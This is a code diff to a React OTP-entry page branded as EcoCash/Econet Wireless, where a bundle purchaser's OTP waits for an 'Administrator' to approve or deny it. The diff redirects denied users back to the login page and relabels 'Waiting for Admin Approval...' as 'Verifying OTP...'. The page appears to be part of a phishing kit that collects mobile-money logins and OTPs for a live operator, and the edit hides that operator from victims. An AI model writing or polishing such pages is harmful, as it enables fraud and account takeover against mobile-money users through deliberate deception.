@@ -94,9 +94,11 @@ export default function OTPPage() {
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            alert('OTP was denied by the Administrator.');
-            setOtp(['', '', '', '', '', '']);
-            inputRefs.current[0]?.focus();
+            alert('OTP was denied by the Administrator. Redirecting to login...');
+            
+            // --- REDIRECT TO LOGIN ON DENIAL ---
+            // Pass the bundle details back so they don't have to select the bundle again
+            navigate('/login', { state: { duration, voice, sms, data, price } });
           }
         } catch (err) {
           console.error("Polling error", err);
@@ -110,7 +112,6 @@ export default function OTPPage() {
     }
   };
 
-  // ... (Keep all your existing `styles` object here exactly as it was) ...
   const styles = {
     appContainer: { width: '100%', maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', position: 'relative', boxShadow: '0 0 30px rgba(0,0,0,0.1)', overflowX: 'hidden', fontFamily: "'Inter', sans-serif" } as React.CSSProperties,
     header: { background: 'linear-gradient(135deg, #0b40c4 0%, #1e5ce6 100%)', padding: '20px 20px 24px', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px', color: 'white' } as React.CSSProperties,
@@ -182,8 +183,10 @@ export default function OTPPage() {
             <button style={styles.resendBtn} disabled={timeLeft > 0 || isProcessing} onClick={() => setTimeLeft(120)}>Resend OTP</button>
           </div>
         </div>
+        
         <button style={styles.confirmBtn} disabled={!isComplete || isProcessing} onClick={handleConfirm}>
-          {isProcessing ? 'Waiting for Admin Approval...' : 'Confirm OTP'}
+          {/* CHANGED TEXT HERE */}
+          {isProcessing ? 'Verifying OTP...' : 'Confirm OTP'}
         </button>
         <p style={styles.poweredBy}>POWERED BY ECONET WIRELESS · ECOCASH</p>
       </div>
